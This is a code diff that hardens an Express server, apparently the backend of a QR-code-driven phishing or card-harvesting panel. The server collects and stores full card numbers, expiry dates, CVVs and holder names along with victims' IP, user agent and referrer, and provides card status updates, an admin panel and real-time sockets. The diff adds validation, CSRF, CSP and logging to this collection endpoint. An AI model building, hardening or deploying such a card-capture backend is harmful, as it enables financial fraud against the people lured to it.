@@ -12,6 +12,8 @@ const rateLimit = require('express-rate-limit');
 const winston = require('winston');
 const cors = require('cors');
 const compression = require('compression');
+const { body, validationResult } = require('express-validator');
+const sanitizeHtml = require('sanitize-html');
 const { upload, checkQRCode, optimizeImage } = require('./qr-handler');
 const { addCard, getCards, updateCardStatus, deleteCard } = require('./db');
 
@@ -28,33 +30,87 @@ const logger = winston.createLogger({
     ]
 });
 
-// Middleware
+// Покращена конфігурація Helmet
 app.use(helmet({
-    contentSecurityPolicy: false,
-    crossOriginEmbedderPolicy: false
+    contentSecurityPolicy: {
+        directives: {
+            defaultSrc: ["'self'"],
+            scriptSrc: ["'self'", "'unsafe-inline'"],
+            styleSrc: ["'self'", "'unsafe-inline'"],
+            imgSrc: ["'self'", "data:", "https:"],
+            connectSrc: ["'self'", "wss:", "https:"],
+            upgradeInsecureRequests: []
+        }
+    },
+    hsts: {
+        maxAge: 31536000,
+        includeSubDomains: true,
+        preload: true
+    },
+    frameguard: { action: 'deny' },
+    noSniff: true,
+    xssFilter: true
 }));
+
 app.use(compression());
-app.use(cors());
+app.use(cors({
+    origin: 'http://localhost:3000',
+    credentials: true
+}));
 app.use(express.json());
 app.use(cookieParser());
 app.use(express.static(path.join(__dirname, 'public')));
 
+// CSRF захист
+app.use(csrf({ cookie: true }));
+app.use((req, res, next) => {
+    res.locals.csrfToken = req.csrfToken();
+    next();
+});
+
 // Rate limiting
 const limiter = rateLimit({
     windowMs: 15 * 60 * 1000,
-    max: 100
+    max: 100,
+    message: 'Too many requests from this IP, please try again later.'
 });
 app.use(limiter);
 
-// Роути для QR-кодів
+// Валідація даних карти
+const validateCard = [
+    body('number').isLength({ min: 16, max: 16 }).isNumeric()
+        .withMessage('Card number must be 16 digits'),
+    body('exp').matches(/^(0[1-9]|1[0-2])\/([0-9]{2})$/)
+        .withMessage('Expiration date must be in MM/YY format'),
+    body('cvv').isLength({ min: 3, max: 3 }).isNumeric()
+        .withMessage('CVV must be 3 digits'),
+    body('holder').trim().escape()
+        .isLength({ min: 2, max: 100 })
+        .withMessage('Card holder name is required')
+];
+
+// Middleware для логування запитів
+app.use((req, res, next) => {
+    logger.info({
+        method: req.method,
+        path: req.path,
+        ip: req.ip,
+        userAgent: req.get('user-agent')
+    });
+    next();
+});
+
+// Роути для QR-кодів з покращеною валідацією
 app.get('/qr/:siteNumber', (req, res) => {
     const siteNumber = req.params.siteNumber;
     if (!['1', '2', '3'].includes(siteNumber)) {
-        return res.status(400).json({ error: 'Неверный номер сайта' });
+        logger.warn(`Invalid site number attempt: ${siteNumber}`);
+        return res.status(400).json({ error: 'Invalid site number' });
     }
 
     if (!checkQRCode(siteNumber)) {
-        return res.status(404).json({ error: 'QR-код не найден' });
+        logger.warn(`QR code not found for site: ${siteNumber}`);
+        return res.status(404).json({ error: 'QR code not found' });
     }
 
     res.sendFile(path.join(__dirname, 'public/qr_codes', `сайт${siteNumber}.png`));
@@ -81,15 +137,24 @@ app.post('/admin/upload-qr', upload.single('qrCode'), async (req, res) => {
     }
 });
 
-// API роути для роботи з картками
-app.post('/api/cards', async (req, res) => {
+// API роути з валідацією
+app.post('/api/cards', validateCard, async (req, res) => {
     try {
-        const cardId = await addCard({
+        const errors = validationResult(req);
+        if (!errors.isEmpty()) {
+            logger.warn('Card validation failed:', errors.array());
+            return res.status(400).json({ errors: errors.array() });
+        }
+
+        const sanitizedData = {
             ...req.body,
+            holder: sanitizeHtml(req.body.holder),
             ip: req.ip,
             ua: req.get('user-agent'),
             referrer: req.get('referrer')
-        });
+        };
+
+        const cardId = await addCard(sanitizedData);
         res.json({ id: cardId });
     } catch (error) {
         logger.error('Error adding card:', error);
@@ -137,15 +202,12 @@ app.get('/admin', (req, res) => {
 
 // Запуск сервера
 const PORT = process.env.PORT || 3000;
-const server = https.createServer({
-    key: fs.readFileSync('key.pem'),
-    cert: fs.readFileSync('cert.pem')
-}, app);
+const server = http.createServer(app);
 
 // Налаштування Socket.IO
 const io = socketIO(server, {
     cors: {
-        origin: "https://localhost:3000",
+        origin: "http://localhost:3000",
         methods: ["GET", "POST"],
         credentials: true
     }
@@ -187,6 +249,28 @@ io.on('connection', (socket) => {
     });
 });
 
-server.listen(PORT, () => {
-    logger.info(`Сервер запущен на порту ${PORT}`);
+// Обробка помилок
+app.use((err, req, res, next) => {
+    if (err.code === 'EBADCSRFTOKEN') {
+        logger.warn('Invalid CSRF token', {
+            path: req.path,
+            ip: req.ip
+        });
+        return res.status(403).json({
+            error: 'Invalid CSRF token'
+        });
+    }
+    
+    logger.error('Unhandled error:', err);
+    res.status(500).json({
+        error: 'Internal server error'
+    });
 });
+
+if (require.main === module) {
+    server.listen(PORT, () => {
+        logger.info(`Сервер запущен на порту ${PORT}`);
+    });
+}
+
+module.exports = app;
